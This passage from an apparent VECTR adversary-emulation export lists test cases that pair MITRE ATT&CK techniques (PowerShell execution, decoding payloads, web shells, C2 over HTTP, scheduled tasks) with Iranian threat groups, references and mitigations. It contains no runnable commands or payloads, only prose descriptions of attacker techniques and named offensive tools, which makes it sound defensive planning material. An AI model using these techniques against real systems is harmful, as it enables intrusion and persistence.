execution.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--f4882e23-8aa7-4b12-b28a-b349c12ee9e0","relationship--4fde23ab-b8db-4275-ac37-37e608cb00b0","relationship--b188b994-7965-4c34-81d6-307f218ba80e","course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f","relationship--79568b8a-09c2-40fa-acd9-c7d369059b6a","course-of-action--590777b3-b475-4c7c-aaf8-f4a73b140312","relationship--39962764-cf46-4f39-9dd9-95b0ced56d93","course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31","relationship--1f8f6283-6004-4204-a54f-759e9c0519b1","course-of-action--d0415180-51e9-40ce-b57c-c332b0b441f2","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Babinec, K. (2014, April 28). Executing PowerShell scripts from C#. Retrieved April 22, 2019. https://blogs.msdn.microsoft.com/kebab/2014/04/28/executing-powershell-scripts-from-c/","Christensen, L.. (2015, December 28). The Evolution of Offensive PowerShell Invocation. Retrieved December 8, 2018. https://silentbreaksecurity.com/powershell-jobs-without-powershell-exe/","Dunwoody, M. (2016, February 11). GREATER VISIBILITY THROUGH POWERSHELL LOGGING. Retrieved February 16, 2016. https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html","Falcone, R. and Lee, B. (2017, October 9). OilRig Group Steps Up Attacks with New Delivery Documents and New Injector Trojan. Retrieved January 8, 2018. https://researchcenter.paloaltonetworks.com/2017/10/unit42-oilrig-group-steps-attacks-new-delivery-documents-new-injector-trojan/","Haight, J. (2016, April 21). PS>Attack. Retrieved June 1, 2016. https://github.com/jaredhaight/PSAttack","Malware Archaeology. (2016, June). WINDOWS POWERSHELL LOGGING CHEAT SHEET - Win 7/Win 2008 or later. Retrieved June 24, 2016. http://www.malwarearchaeology.com/s/Windows-PowerShell-Logging-Cheat-Sheet-ver-June-2016-v2.pdf","Meyers, A. (2018, November 27). Meet CrowdStrike’s Adversary of the Month for November: HELIX KITTEN. Retrieved December 18, 2018. https://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-november-helix-kitten/","Microsoft. (n.d.). Windows PowerShell Scripting. Retrieved April 28, 2016. https://technet.microsoft.com/en-us/scriptcenter/dd742419.aspx","PowerSploit. (n.d.). Retrieved December 4, 2014. https://github.com/mattifestation/PowerSploit","Sardiwal, M, et al. (2017, December 7). New Targeted Attack in the Middle East by APT34, a Suspected Iranian Threat Group, Using CVE-2017-11882 Exploit. Retrieved December 20, 2017. https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html","Warner, J.. (2015, January 6). Inexorable PowerShell – A Red Teamer’s Tale of Overcoming Simple AppLocker Policies. Retrieved December 8, 2018. http://www.sixdub.net/?p=367"],"mitreId":"T1086"},"blueTeam":{"successfulDetectionBehaviors":["Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.","Enforce binary and application integrity with digital signature verification to prevent untrusted code from executing.","Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.","It may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions. When PowerShell is necessary, restrict PowerShell execution policy to administrators and to only execute signed scripts. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration. (Citation: Netspi PowerShell Execution Policy Bypass) Disable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--2d553472-cb1b-4d8d-ae68-ab9197bce3ab","vectrId":"2d553472-cb1b-4d8d-ae68-ab9197bce3ab","name":null,"offset":0,"createTime":1.574779748235E12,"updateTime":1.574779748235E12,"phaseId":"cc4c7093-0b33-4cf6-95a7-eff607c86c79","templateId":"2d553472-cb1b-4d8d-ae68-ab9197bce3ab","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Deobfuscate/Decode Files or Information","variant":"MuddyWater - Deobfuscate/Decode Files or Information","objective":"Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware, [Scripting](https://attack.mitre.org/techniques/T1064), [PowerShell](https://attack.mitre.org/techniques/T1086), or by using utilities present on the system.\n\nOne such example is use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file. (Citation: Malwarebytes Targeted Attack against Saudi Arabia)\n\nAnother example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload. (Citation: Carbon Black Obfuscation Sept 2016)\n\nPayloads may be compressed, archived, or encrypted in order to avoid detection.  These payloads may be used with [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as Javascript.","command":"[MuddyWater](https://attack.mitre.org/groups/G0069) decoded base64-encoded PowerShell commands using a VBS file.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c","relationship--58545f9a-d2cf-4466-bc7f-9cdbdce25d70","relationship--8104dfee-8883-4f7c-8f7d-84c9b409efc3","course-of-action--d01f473f-3cdc-4867-9e55-1de9cf1986f0","intrusion-set--269e8108-68c6-4f99-b911-14b2e765dec2"]}],"references":["Adair, S.. (2016, November 9). PowerDuke: Widespread Post-Election Spear Phishing Campaigns Targeting Think Tanks and NGOs. Retrieved January 11, 2017. https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/","ClearSky Cyber Security. (2018, November). MuddyWater Operations in Lebanon and Oman: Using an Israeli compromised domain for a two-stage campaign. Retrieved November 29, 2018. https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf","Malwarebytes Labs. (2017, March 27). New targeted attack against Saudi Arabia Government. Retrieved July 3, 2017. https://blog.malwarebytes.com/cybercrime/social-engineering-cybercrime/2017/03/new-targeted-attack-saudi-arabia-government/","Singh, S. et al.. (2018, March 13). Iranian Threat Group Updates Tactics, Techniques and Procedures in Spear Phishing Campaign. Retrieved April 11, 2018. https://www.fireeye.com/blog/threat-research/2018/03/iranian-threat-group-updates-ttps-in-spear-phishing-campaign.html","Tedesco, B. (2016, September 23). Security Alert Summary. Retrieved February 12, 2018. https://www.carbonblack.com/2016/09/23/security-advisory-variants-well-known-adware-families-discovered-include-sophisticated-obfuscation-techniques-previously-associated-nation-state-attacks/","Villanueva, M., Co, M. (2018, June 14). Another Potential MuddyWater Campaign uses Powershell-based PRB-Backdoor. Retrieved July 3, 2018. https://blog.trendmicro.com/trendlabs-security-intelligence/another-potential-muddywater-campaign-uses-powershell-based-prb-backdoor/"],"mitreId":"T1140"},"blueTeam":{"successfulDetectionBehaviors":["Identify unnecessary system utilities or potentially malicious software that may be used to deobfuscate or decode files or information, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--2e88c6a0-8f84-4b54-8e23-726ca5eebda8","vectrId":"2e88c6a0-8f84-4b54-8e23-726ca5eebda8","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","templateId":"2e88c6a0-8f84-4b54-8e23-726ca5eebda8","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"System Network Configuration Discovery","variant":"APT39 - System Network Configuration Discovery","objective":"Adversaries will likely look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).\n\nAdversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.","command":"[APT39](https://attack.mitre.org/groups/G0087) has used nbtscan to discover vulnerable systems.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0","relationship--964233cc-fa6c-4754-9684-6546eb6d5a4a","relationship--98bdcea2-1c8d-4a65-b75d-075a00d6e87c","course-of-action--684feec3-f9ba-4049-9d8f-52d52f3e0e40","intrusion-set--44e43fad-ffcb-4210-abcf-eaaed9735f80"]}],"references":["Hawley et al. (2019, January 29). APT39: An Iranian Cyber Espionage Group Focused on Personal Information. Retrieved February 19, 2019. https://www.fireeye.com/blog/threat-research/2019/01/apt39-iranian-cyber-espionage-group-focused-on-personal-information.html"],"mitreId":"T1016"},"blueTeam":{"successfulDetectionBehaviors":["Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about a system's network configuration, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--2ecb02e3-1f75-4a63-947c-4e20749cc88e","vectrId":"2ecb02e3-1f75-4a63-947c-4e20749cc88e","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"69a00d73-ea90-401c-8ef0-9fcd1785d0b4","templateId":"2ecb02e3-1f75-4a63-947c-4e20749cc88e","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Data Encoding","variant":"APT33 - Data Encoding","objective":"Command and control (C2) information is encoded using a standard data encoding system. Use of data encoding may be to adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64,  MIME, UTF-8, or other binary-to-text and character encoding systems. (Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.","command":"[APT33](https://attack.mitre.org/groups/G0064) has used base64 to encode command and control traffic.Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--cc7b8c4e-9be0-47ca-b0bb-83915ec3ee2f","relationship--e1492807-b520-412b-9df7-105aefc29deb","relationship--1e2075a3-5271-4ebf-aa9b-6a09ea985b76","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","relationship--b274a57d-9d27-4e33-b6dc-15e007805838","course-of-action--fcbe8424-eb3e-4794-b76d-e743f5a49b8b","intrusion-set--fbd29c89-18ba-4c2d-b792-51c0adee049f"]}],"references":["Ackerman, G., et al. (2018, December 21). OVERRULED: Containing a Potentially Destructive Adversary. Retrieved January 17, 2019. https://www.fireeye.com/blog/threat-research/2018/12/overruled-containing-a-potentially-destructive-adversary.html","Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016. https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf","Wikipedia. (2016, December 26). Binary-to-text encoding. Retrieved March 1, 2017. https://en.wikipedia.org/wiki/Binary-to-text_encoding","Wikipedia. (2017, February 19). Character Encoding. Retrieved March 1, 2017. https://en.wikipedia.org/wiki/Character_encoding"],"mitreId":"T1132"},"blueTeam":{"successfulDetectionBehaviors":["Use intrusion detection signatures to block traffic at network boundaries.","Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. (Citation: University of Birmingham C2)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--2f063fe2-70c1-4af7-9f12-038ecd1541d4","vectrId":"2f063fe2-70c1-4af7-9f12-038ecd1541d4","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"69a00d73-ea90-401c-8ef0-9fcd1785d0b4","templateId":"2f063fe2-70c1-4af7-9f12-038ecd1541d4","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Standard Application Layer Protocol","variant":"Magic Hound - Standard Application Layer Protocol - Pupy","objective":"Adversaries may communicate using a common, standardized application layer protocol such as HTTP, HTTPS, SMTP, or DNS to avoid detection by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.\n\nFor connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are RPC, SSH, or RDP.\n---\n[Pupy](https://attack.mitre.org/software/S0192) is an open source, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool. (Citation: GitHub Pupy) It is written in Python and can be generated as a payload in several different ways (Windows exe, Python file, PowerShell oneliner/file, Linux elf, APK, Rubber Ducky, etc.). (Citation: GitHub Pupy) [Pupy](https://attack.mitre.org/software/S0192) is publicly available on GitHub. (Citation: GitHub Pupy)","command":"[Magic Hound](https://attack.mitre.org/groups/G0059) malware has used HTTP and IRC for C2.Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level.\n---\n[Pupy](https://attack.mitre.org/software/S0192) can communicate over HTTP for C2.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["5a7984d4-d134-4fbd-ab45-5dfa73bfd16b"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6","relationship--2dd15583-34cd-4b49-a6ba-4bd647b7ff27","relationship--2a0b74b3-cbc3-45fa-aba4-eabdb0cb89b5","course-of-action--addb3703-5a59-4461-9bcd-7e2b5d4e92a0","relationship--19f35c88-92c4-4e98-b024-be9f6731bdb5","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","tool--cb69b20d-56d0-41ab-8440-4a4b251614d4","relationship--85112c0c-3096-4118-9ba6-ed173128544f","intrusion-set--f9d6633a-55e6-4adc-9263-6ae080421a13"]}],"references":["Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016. https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf","Lee, B. and Falcone, R. (2017, February 15). Magic Hound Campaign Attacks Saudi Targets. Retrieved December 27, 2017. https://researchcenter.paloaltonetworks.com/2017/02/unit42-magic-hound-campaign-attacks-saudi-targets/","Nicolas Verdier. (n.d.). Retrieved January 29, 2018. https://github.com/n1nj4sec/pupy"],"mitreId":"T1071"},"blueTeam":{"successfulDetectionBehaviors":["Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools. (Citation: University of Birmingham C2)","Use intrusion detection signatures to block traffic at network boundaries."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--2f3aa0de-aec4-47d9-8203-e9b139f9ad3d","vectrId":"2f3aa0de-aec4-47d9-8203-e9b139f9ad3d","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"47da3f56-d9fc-4735-a343-b57b4ad8eca5","templateId":"2f3aa0de-aec4-47d9-8203-e9b139f9ad3d","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Web Shell","variant":"APT39 - Web Shell","objective":"A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server. In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (see, for example, China Chopper Web shell client). (Citation: Lee 2013)\n\nWeb shells may serve as [Redundant Access](https://attack.mitre.org/techniques/T1108) or as a persistence mechanism in case an adversary's primary access methods are detected and removed.","command":"[APT39](https://attack.mitre.org/groups/G0087) has installed ANTAK and ASPXSPY web shells.Audit account and group permissions to ensure that accounts used to manage servers do not overlap with accounts and permissions of users in the internal network that could be acquired through Credential Access and used to log into the Web server and plant a Web shell or pivot from the Web server into the internal network.\n---\nEnsure that externally facing Web servers are patched regularly to prevent adversary access through [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) to gain remote code access or through file inclusion weaknesses that may allow adversaries to upload files or scripts that are automatically served as Web pages.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--c16e5409-ee53-4d79-afdc-4099dc9292df","relationship--5fea62e7-67f8-4ff2-875d-a48393f99135","relationship--957ca941-c089-4059-ba09-1c1d4cf62881","course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f","relationship--38d4c148-6fe8-4703-94e5-1b79b1cf5b8c","course-of-action--bcc91b8c-f104-4710-964e-1d5409666736","relationship--d0a4f78d-4257-4597-ade6-ac9e0c527775","course-of-action--e5d930e9-775a-40ad-9bdb-b941d8dfe86b","intrusion-set--44e43fad-ffcb-4210-abcf-eaaed9735f80"]}],"references":["Hawley et al. (2019, January 29). APT39: An Iranian Cyber Espionage Group Focused on Personal Information. Retrieved February 19, 2019. https://www.fireeye.com/blog/threat-research/2019/01/apt39-iranian-cyber-espionage-group-focused-on-personal-information.html","Lee, T., Hanzlik, D., Ahl, I. (2013, August 7). Breaking Down the China Chopper Web Shell - Part I. Retrieved March 27, 2015. https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html","US-CERT. (2015, November 13). Compromised Web Servers and Web Shells - Threat Awareness and Guidance. Retrieved June 8, 2016. https://www.us-cert.gov/ncas/alerts/TA15-314A"],"mitreId":"T1100"},"blueTeam":{"successfulDetectionBehaviors":["Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.","Ensure that externally facing Web servers are patched regularly to prevent adversary access through [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) to gain remote code access or through file inclusion weaknesses that may allow adversaries to upload files or scripts that are automatically served as Web pages. \n\nAudit account and group permissions to ensure that accounts used to manage servers do not overlap with accounts and permissions of users in the internal network that could be acquired through Credential Access and used to log into the Web server and plant a Web shell or pivot from the Web server into the internal network. (Citation: US-CERT Alert TA15-314A Web Shells)","Perform regular software updates to mitigate exploitation risk."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--30cc13ed-680a-4352-a093-a38e616f81b2","vectrId":"30cc13ed-680a-4352-a093-a38e616f81b2","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"47da3f56-d9fc-4735-a343-b57b4ad8eca5","templateId":"30cc13ed-680a-4352-a093-a38e616f81b2","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"External Remote Services","variant":"OilRig - External Remote Services","objective":"Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1028) can also be used externally.\n\nAdversaries may use remote services to initially access and/or persist within a network. (Citation: Volexity Virtual Private Keylogging) Access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as part of [Redundant Access](https://attack.mitre.org/techniques/T1108) during an operation.","command":"[OilRig](https://attack.mitre.org/groups/G0049) uses remote services such as VPN, Citrix, or OWA to persist in an environment.Use strong two-factor or multi-factor authentication for remote service accounts to mitigate an adversary's ability to leverage stolen credentials, but be aware of [Two-Factor Authentication Interception](https://attack.mitre.org/techniques/T1111) techniques for some two-factor authentication implementations.\n---\nDeny direct remote access to internal systems through the use of network proxies, gateways, and firewalls.\n---\nLimit access to remote services through centrally managed concentrators such as VPNs and other managed remote access systems.\n---\nDisable or block remotely available services that may be unnecessary.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d","relationship--55e34506-746d-4895-928b-72c2e358161d","relationship--e23d57b4-5bc4-4d06-9084-9c99464c4af8","course-of-action--b045d015-6bed-4490-bd38-56b41ece59a0","relationship--8df2f4b5-3f60-4b8f-b4aa-dd76eb347ab0","course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c","relationship--9eaaffb7-4dc4-4aac-a1d5-675b71e587df","course-of-action--1dcaeb21-9348-42ea-950a-f842aaf1ae1f","relationship--9aaf5e70-4080-4f73-8d6d-3b19f754e9b9","course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31","relationship--a93e5f9f-5c8c-4832-93db-a6c180840a43","course-of-action--d4fd04e0-d1a4-4b5a-a5bb-16683cdbcce2","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Adair, S. (2015, October 7). Virtual Private Keylogging: Cisco Web VPNs Leveraged for Access and Persistence. Retrieved March 20, 2017. https://www.volexity.com/blog/2015/10/07/virtual-private-keylogging-cisco-web-vpns-leveraged-for-access-and-persistence/","Davis, S. and Caban, D. (2017, December 19). APT34 - New Targeted Attack in the Middle East. Retrieved December 20, 2017. https://www.brighttalk.com/webcast/10703/296317/apt34-new-targeted-attack-in-the-middle-east"],"mitreId":"T1133"},"blueTeam":{"successfulDetectionBehaviors":["Use two or more pieces of evidence to authenticate to a system; such as username and password in addition to a token from a physical smart card or token generator.","Architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network.","Prevent access to file shares, remote access to systems, unnecessary services. Mechanisms to limit access may include use of network concentrators, RDP gateways, etc.","Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.","Limit access to remote services through centrally managed concentrators such as VPNs and other managed remote access systems. Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls. Disable or block remotely available services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1028). Use strong two-factor or multi-factor authentication for remote service accounts to mitigate an adversary's ability to leverage stolen credentials, but be aware of [Two-Factor Authentication Interception](https://attack.mitre.org/techniques/T1111) techniques for some two-factor authentication implementations."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--31b17735-053e-48aa-a927-c81c3021a3f9","vectrId":"31b17735-053e-48aa-a927-c81c3021a3f9","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"47da3f56-d9fc-4735-a343-b57b4ad8eca5","templateId":"31b17735-053e-48aa-a927-c81c3021a3f9","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Scheduled Task","variant":"OilRig - Scheduled Task","objective":"Utilities such as [at](https://attack.mitre.org/software/S0110) and [schtasks](https://attack.mitre.org/software/S0111), along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time. A task can also be scheduled on a remote system, provided the proper authentication is met to use RPC and file and printer sharing is turned on. Scheduling a task on a remote system typically required being a member of the Administrators group on the remote system. (Citation: TechNet Task Scheduler Security)\n\nAn adversary may use task scheduling to execute programs at system startup or on a scheduled basis for persistence, to conduct remote Execution as part of Lateral Movement, to gain SYSTEM privileges, or to run a process under the context of a specified account.","command":"[OilRig](https://attack.mitre.org/groups/G0049) has created scheduled tasks that run a VBScript to execute a payload on victim machines.\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to schedule tasks using whitelisting tools, like AppLocker, or Software Restriction Policies where appropriate.\n---\nToolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges.\n---\nConfigure the Increase Scheduling Priority option to only allow the Administrators group 